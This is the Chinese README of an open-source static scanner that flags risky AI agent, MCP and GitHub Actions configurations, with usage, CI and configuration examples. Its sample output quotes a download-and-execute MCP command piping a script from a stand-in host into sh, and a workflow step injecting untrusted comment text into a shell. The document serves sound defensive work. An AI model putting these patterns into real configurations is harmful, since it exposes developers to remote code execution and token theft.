# Agentic Risk Scan

[![CI](https://github.com/ecoreal/agentic-risk-scan/actions/workflows/ci.yml/badge.svg)](https://github.com/ecoreal/agentic-risk-scan/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

[English](README.md) · 中文

面向 AI Agent 工作流、MCP 配置与已提交 Agent 指令文件的静态安全扫描器。

AI Agent 已成为软件供应链的一部分。它们会读取 PR 标题、issue 评论、提示词文件、
MCP 配置、包脚本和 workflow 产物等各类输入。`agentic-risk-scan` 检查的正是让这
些输入变得危险的仓库模式：可写的 GitHub Token、不可信输入的 shell 拼接、隐藏
Unicode 提示词文本、下载即执行的 MCP 服务器、内联密钥和危险的安装脚本。

- **47 条高信号规则**，覆盖 GitHub Actions、MCP 配置、Agent 指令文件、
  Agent 客户端设置与包脚本。
- **零依赖**（仅用 Python 3.10+ 标准库）——一次 `pip install` 完成安装，
  不需要先审计一堆锁文件再来信任审计工具本身。
- **CI 原生**：复合 GitHub Action、Code Scanning 的 SARIF 输出、PR 内联注解、
  以及 `--changed-from` 增量扫描。
- **精度可量化**：公开真实仓库的扫描语料，每个误报修复都有前后对比计数，
  见 [docs/evaluation.md](docs/evaluation.md)。
- **绝不执行你的代码**：纯静态分析，无网络请求、不执行配置。唯一的子进程是
  在你主动使用 `--changed-from` 时的 `git diff`。

深入了解：

- [研究笔记](docs/research.md)
- [项目简介](docs/project-brief.md)
- [威胁模型](docs/threat-model.md)
- [评估语料](docs/evaluation.md)
- [报告指南](docs/reporting.md)
- [接入指南](docs/adoption.md)
- [发布指南](docs/releasing.md)

## 快速开始

```bash
python3 -m pip install -e .
agentic-risk-scan scan .
```

不安装直接运行：

```bash
PYTHONPATH=src python3 -m agentic_risk_scan scan .
```

为 GitHub Code Scanning 生成 SARIF：

```bash
agentic-risk-scan scan . --format sarif --output agentic-risk.sarif --fail-on high
```

输出 GitHub workflow 注解：

```bash
agentic-risk-scan scan . --format github --fail-on high
```

只扫描 Pull Request 中变更的文件：

```bash
agentic-risk-scan scan . --changed-from origin/main --format github
```

在制定策略之前，先盘点仓库的 Agent 攻击面：

```bash
agentic-risk-scan inventory . --format markdown
```

诊断扫描器接入状态与当前安全态势：

```bash
agentic-risk-scan doctor .
```

生成合并的 Markdown 审查报告：

```bash
agentic-risk-scan report . --output agentic-risk-report.md
agentic-risk-scan report . --format html --output agentic-risk-report.html
```

生成初始配置：

```bash
agentic-risk-scan init-config
```

生成开箱即用的 GitHub Actions workflow：

```bash
agentic-risk-scan init-ci
agentic-risk-scan init-ci --report-artifact
```

## 检测内容

- `pull_request_target` workflow 检出了不可信的 PR 代码。
- 在 issue、评论、PR 或 workflow-run 触发器上持有写 Token 的 AI/Agent 类
  GitHub Actions。
- 将 PR、issue、评论、讨论或手动输入中的 `github.event.*` 文本拼接进 shell
  的命令。
- 不可信触发器 workflow 中的 Secret 与 OIDC 暴露。
- Fail-open CI：不可信触发器 workflow 中验证、扫描或安装步骤用
  `continue-on-error` 放行失败（`GHA009`）。
- 不可信触发器使用自托管 runner。
- `AGENTS.md`、`CLAUDE.md`、`.github/copilot-instructions.md`、
  `.cursor/rules/*`、Agent Skill 指令
  （`.claude/skills/**/SKILL.md`、`skills/**/SKILL.md`）等文件中的
  Prompt 注入短语与隐藏 Unicode。
- `.claude/settings.json`、`.codex/config.toml`、`.gemini/settings.json` 中
  有风险的已提交 Agent 客户端配置：宽泛的工具授权、关闭的审批、全访问权限
  档、被绕过的权限提示（`permissions.defaultMode`）、疑似字面密钥值、
  以及被削弱的密钥脱敏。
- 通过 shell 包装启动、运行时下载、未固定版本的 `npx`、宽泛运行时参数、
  临时路径、内联疑似密钥或注入代码的环境变量（`NODE_OPTIONS`、`LD_PRELOAD`、
  `PYTHONPATH`）配置的 MCP 服务器。
- 使用明文 HTTP、指向链路本地/云元数据地址、或带有已提交密钥头的远程
  （HTTP/SSE）MCP 服务器。
- 含 `curl | sh`、`eval`、内联解释器、打印密钥或远程 tarball 依赖的 npm
  安装生命周期脚本。

## 示例

```bash
PYTHONPATH=src python3 -m agentic_risk_scan scan examples/unsafe-ai-pr-bot --fail-on none
```

真实输出（可用上面的命令复现）：

```text
Agentic Risk Scan
root: examples/unsafe-ai-pr-bot
risk score: 100/100
findings: critical=1, high=11, medium=3, low=1
scanned files: 4, skipped files: 0

[CRITICAL] GHA001 pull_request_target checks out untrusted PR code
  at: .github/workflows/unsafe.yml:16
  why: This workflow runs with target-repository privileges and checks out code from the pull request head.
  evidence: - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  fix: Use pull_request with read-only permissions, or split analysis and write-back into separate workflows connected by reviewed artifacts.

[HIGH] GHA003 Untrusted GitHub event data is interpolated into shell
  at: .github/workflows/unsafe.yml:22
  why: PR, issue, comment, discussion, or workflow input text is used inside a shell command. Attackers can inject shell syntax through GitHub content.
  evidence: echo "${{ github.event.comment.body }}" > prompt.txt ...
  fix: Pass event payload through files or environment variables, quote safely, or process it in a language runtime without shell interpolation.

[HIGH] MCP002 MCP server uses download-and-execute bootstrap
  at: .mcp.json:3
  why: MCP server 'bootstrap' downloads code and pipes it into an interpreter.
  evidence: bash -c curl https://example.invalid/mcp.sh | sh
  fix: Install MCP servers from pinned packages or checked-in scripts instead of runtime fetches.
```

每条发现都会说明输入边界、危险的权限、证据行和修复建议。安全示例的得分是
`0/100`：

```bash
PYTHONPATH=src python3 -m agentic_risk_scan scan examples/safe-agent-workflow --fail-on high
```

## 与通用 SAST 工具的差异

传统 SAST 找的是应用代码漏洞：注入汇聚点、不安全反序列化、弱加密。
`agentic-risk-scan` 检查的是另一层——决定 AI Agent 或不可信贡献者输入在任何
应用代码运行之前能造成多大破坏的仓库配置。这些威胁是面向代码的扫描器不会
建模的。

- **对特权 workflow 的 PR/评论注入。** 检出 fork 代码的
  `pull_request_target` workflow，或把 `github.event.*` 文本拼接进 shell 的
  步骤，都在把写权限 Token 交给不可信输入。本扫描器直接标记这条边界
  （`GHA001`、`GHA003`），而不是把 workflow 当成惰性 YAML。
- **MCP 下载即执行引导。** 命令中把远程脚本管道进解释器（`curl … | sh`）的
  MCP 服务器，会在 Agent 启动时在开发者工作站上运行攻击者控制的代码。
  `MCP002` 捕获的就是这种存在于 `.mcp.json`（而非任何 SAST 会解析的源码文件）
  中的供应链模式。
- **隐藏 Unicode 与 Prompt 注入指令。** `AGENTS.md`、`CLAUDE.md` 或
  `.cursor/rules/*` 中的双向控制字符（`AGENT001`）、零宽字符（`AGENT002`）、
  Prompt 注入短语（`AGENT003`）在审查时看似无害，却能操纵 Agent 行为。
  通用 linter 把这些文件当散文直接跳过。
- **过权限的 Agent 客户端配置。** 已提交的 `.claude` / `.codex` / `.gemini`
  设置中被关闭的沙箱（`CFG006`、`CFG007`）、被关闭的审批（`CFG008`）、
  全访问权限档（`CFG011`）、内联疑似密钥值（`CFG012`），都会在 Agent 做任何
  事之前放大影响半径。这是配置风险，不是代码风险。

本项目的范围刻意限定在 Agent 攻击面，而不是通用应用安全。两者都应运行：用
SAST 工具管应用代码，用本工具管 SAST 不会读取的 Agent 与 workflow 配置。
完整的资产与不可信输入模型见 [docs/threat-model.md](docs/threat-model.md)。

## GitHub Actions

自动生成该 workflow：

```bash
agentic-risk-scan init-ci --mode both
agentic-risk-scan init-ci --mode both --report-artifact
```

```yaml
name: agentic-risk-scan

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  scan:
    permissions:
      contents: read
      security-events: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: python -m pip install "git+https://github.com/ecoreal/agentic-risk-scan@v0"
      - run: agentic-risk-scan scan . --format sarif --output agentic-risk.sarif --fail-on high
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentic-risk.sarif
```

也可以把本仓库当作复合 Action 使用：

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  with:
    fetch-depth: 0
- uses: ecoreal/agentic-risk-scan@v0
  with:
    format: github
    fail_on: high
    changed_from: origin/main
```

## 配置

`agentic-risk-scan` 会从扫描路径或其父目录自动加载
`.agentic-risk-scan.json`。

```json
{
  "$schema": "https://raw.githubusercontent.com/ecoreal/agentic-risk-scan/main/docs/config.schema.json",
  "fail_on": "high",
  "exclude": ["examples/fixtures/**"],
  "disabled_rules": ["PKG004"],
  "severity_overrides": {
    "AGENT005": "low"
  },
  "suppressions": [
    {
      "rule_id": "AGENT005",
      "path": "AGENTS.md",
      "reason": "Tool access is constrained by a separate sandbox policy."
    }
  ]
}
```

CLI 参数会覆盖或扩展配置值：

```bash
agentic-risk-scan scan . --config security/agentic-risk.json
agentic-risk-scan scan . --exclude "examples/**" --disable-rule PKG004
agentic-risk-scan scan . --changed AGENTS.md --changed .github/workflows/agent.yml
```

支持内联忽略，用于有审查记录的例外：

```md
<!-- agentic-risk-scan: disable-next-line AGENT005 -->
allowed-tools: *
```

```yaml
run: echo "${{ github.event.issue.title }}" # agentic-risk-scan: ignore GHA003
```

## 基线

在存量仓库中接入扫描器时，先建立基线：

```bash
agentic-risk-scan scan . --update-baseline .agentic-risk-baseline.json --fail-on none
```

之后只对新增发现失败：

```bash
agentic-risk-scan scan . --baseline .agentic-risk-baseline.json --fail-on high
```

## 输出格式

```bash
agentic-risk-scan scan . --format text
agentic-risk-scan scan . --format json
agentic-risk-scan scan . --format markdown
agentic-risk-scan scan . --format sarif
agentic-risk-scan scan . --format github
```

生成包含发现、清单、执行摘要、建议行动和复现命令的合并 Markdown 报告：

```bash
agentic-risk-scan report . --output agentic-risk-report.md --fail-on high
agentic-risk-scan report . --format html --output agentic-risk-report.html --fail-on high
```

## Pull Request 模式

全仓扫描适合定期审计；PR 检查通常需要更聚焦的信号。用 `--changed` 指定显式
路径，或用 `--changed-from` 让扫描器向 git 询问变更文件：

```bash
agentic-risk-scan scan . --changed AGENTS.md --fail-on medium
agentic-risk-scan scan . --changed-from origin/main --changed-to HEAD --format github
```

已删除的文件默认忽略。默认 git diff filter 是 `ACMR`，覆盖新增、复制、修改
和重命名。

在 GitHub Actions 中，使用 `--changed-from origin/main` 前请把
`actions/checkout` 设置为 `fetch-depth: 0`，或先行抓取 base 分支。

规则参考见 [docs/rules.md](docs/rules.md)。
扫描器威胁模型见 [docs/threat-model.md](docs/threat-model.md)。
真实仓库的实测结果见 [docs/evaluation.md](docs/evaluation.md)。

## Inventory 模式

当你需要仓库中面向 Agent 的文件地图（而不只是通过/失败的检查）时，使用
`inventory`：

```bash
agentic-risk-scan inventory . --format text
agentic-risk-scan inventory . --format json
agentic-risk-scan inventory . --format markdown
```

清单输出覆盖 GitHub Actions workflow、Agent 指令文件、Claude/Codex/Gemini
设置、MCP 配置和 npm 包脚本。适合推进规划、安全审查，以及跨多个仓库接入
Agent 工具链时的前后对比报告。

## Doctor 模式

把扫描器引入仓库时，使用 `doctor`：

```bash
agentic-risk-scan doctor .
agentic-risk-scan doctor . --format markdown --output agentic-risk-doctor.md
agentic-risk-scan doctor . --format json
```

Doctor 会检查项目配置、CI、HTML 报告产物、基线、当前发现和攻击面清单是否
就位，用于接入与推进评审，而非 CI 失败判定。当配置或传入
`--baseline` 时，doctor 用该基线做当前发现态势检查。

## Report 模式

当你需要一份用于 PR 评论、安全评审或接入材料的单一产物时，使用 `report`：

```bash
agentic-risk-scan report . --output agentic-risk-report.md
```

报告把扫描发现与清单输出合并为 Markdown 或独立 HTML 文档，带执行摘要和
建议行动，并遵循与 `scan` 相同的项目配置、基线、变更文件、内联忽略、
输出和失败阈值控制。

在 GitHub Actions 中，本仓库可以直接生成报告：

```yaml
- uses: ecoreal/agentic-risk-scan@v0
  with:
    command: report
    format: html
    output: agentic-risk-report.html
    fail_on: high
```

CI 产物示例见 [docs/reporting.md](docs/reporting.md)。

## 设计原则

- 扫描器本身没有依赖链。
- 在完整安全体系建立之前就有用。
- 每条发现都解释输入边界、危险权限和修复方式。
- 规则偏向高信号的 Agent 工作流风险，而不是通用 lint。

## 路线图

- 覆盖更多 Agent 生态配置。
- 针对 workflow 产物与生成补丁的污点追踪。
- PyPI 发布（自动发布 workflow 已就位，trusted publishing 配置见
  [docs/releasing.md](docs/releasing.md)）。
- npm、Homebrew 与容器发布。

## 贡献

最有用的是附带最小漏洞示例与修复示例的 issue。规则变更应包含测试，并且
不应误报安全示例仓库。
